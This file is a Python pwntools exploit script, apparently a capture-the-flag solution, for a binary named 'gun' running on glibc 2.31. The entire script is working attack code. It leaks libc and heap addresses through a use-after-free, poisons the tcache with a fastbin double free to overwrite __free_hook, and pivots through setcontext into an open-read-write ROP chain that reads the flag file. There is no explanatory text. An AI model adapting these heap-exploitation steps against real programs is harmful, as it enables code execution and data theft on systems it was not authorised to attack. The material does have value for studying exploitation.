from pwn import *
context.arch = 'amd64'
context.log_level = 'debug'

p = process('./gun')
e = ELF('./gun')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')

def cmd(command:int):
    p.recvuntil(b"Action> ")
    p.sendline(str(command).encode())

def shoot(times:int):
    cmd(1)
    p.recvuntil(b"Shoot time: ")
    p.sendline(str(times).encode())

def load(index:int):
    cmd(2)
    p.recvuntil(b"Which one do you want to load?")
    p.sendline(str(index).encode())

def buy(size:int, content):
    cmd(3)
    p.recvuntil(b"Bullet price: ")
    p.sendline(str(size).encode())
    p.recvuntil(b"Bullet Name: ")
    p.sendline(content)

def exp():
    p.sendline(b"arttnba3")

    buy(0x10, b"arttnba3") # idx 0
    buy(0x500, b"arttnba3") # idx 1
    buy(0x10, b"arttnba3") # idx 2

    # leak the libc addr
    load(1)
    shoot(1)
    buy(0x20, b'') # idx 1
    load(1)
    shoot(1)
    main_arena = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 1168
    __malloc_hook = main_arena - 0x10
    libc_base = __malloc_hook - libc.sym['__malloc_hook']
    log.success('libc base: ' + hex(libc_base))

    # leak the heap addr
    buy(0x20, b'AAAAAAAAAAAAAAAA') # idx 1
    load(1)
    shoot(1)
    p.recvuntil(b'AAAAAAAAAAAAAAAA')
    heap_leak = u64(p.recv(6).ljust(8, b'\x00'))
    log.info('heap addr leak: ' + hex(heap_leak))
    heap_base = heap_leak & 0xfffffffff000
    log.success('heap base: ' + hex(heap_base))

    # construct the fake_frame on heap
    fake_frame_addr = heap_base + 0x310 + 0x10
    fake_frame = SigreturnFrame()
    fake_frame['uc_stack.ss_size'] = libc_base + libc.sym['setcontext'] + 61
    fake_frame.rdi = 0
    fake_frame.rsi = libc_base + libc.sym['__free_hook']
    fake_frame.rdx = 0x200
    fake_frame.rsp = libc_base + libc.sym['__free_hook']
    fake_frame.rip = libc_base + libc.sym['read']

    load(0)
    shoot(1)
    buy(0x100, bytes(fake_frame))

    # tcache poisoning with fastbin double free
    for i in range(9):
        buy(0x20, b'arttnba3')
    load(9)
    load(10)
    shoot(2)
    buy(0x20, b'arttnba3') # idx 9
    buy(0x20, b'arttnba3') # idx 10
    load(1)
    for i in range(6):
        load(3 + i)
    shoot(7)
    load(10)
    load(9)
    shoot(3) # double free in fastbin
    for i in range(7):
        buy(0x20, b'arttnba3') # clear the tcache
    buy(0x20, p64(libc_base + libc.sym['__free_hook'])) # idx 9
    buy(0x20, b'./flag\x00') # idx 10, which we use to store the flag
    buy(0x20, b'arttnba3') # idx 11, overlapping chunk with idx 9
    buy(0x20, p64(libc_base + 0x154930)) # idx12, our fake chunk on __free_hook

    # construct the setcontext with gadget chain
    flag_addr = heap_base + 0x570 + 0x10

    payload = p64(0) + p64(fake_frame_addr)# rdi + 8 for the rdx, we set it to the addr of the fake frame

    buy(0x100, payload) # idx 13

    # construct the orw rop chain
    pop_rdi_ret = libc_base + libc.search(asm('pop rdi ; ret')).__next__()
    pop_rsi_ret = libc_base + libc.search(asm('pop rsi ; ret')).__next__()
    pop_rdx_ret = libc_base + libc.search(asm('pop rdx ; ret')).__next__()
    pop_rdx_pop_rbx_ret = libc_base + libc.search(asm('pop rdx ; pop rbx ; ret')).__next__()

    orw = b''
    orw += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(4) + p64(libc_base + libc.sym['open'])
    orw += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_pop_rbx_ret) + p64(0x20) + p64(0) + p64(libc_base + libc.sym['read'])
    orw += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_pop_rbx_ret) + p64(0x20) + p64(0) + p64(libc_base + libc.sym['write'])

    # get the flag
    load(13)
    shoot(1)
    p.sendline(orw)
    p.interactive()

if __name__ == '__main__':
    exp()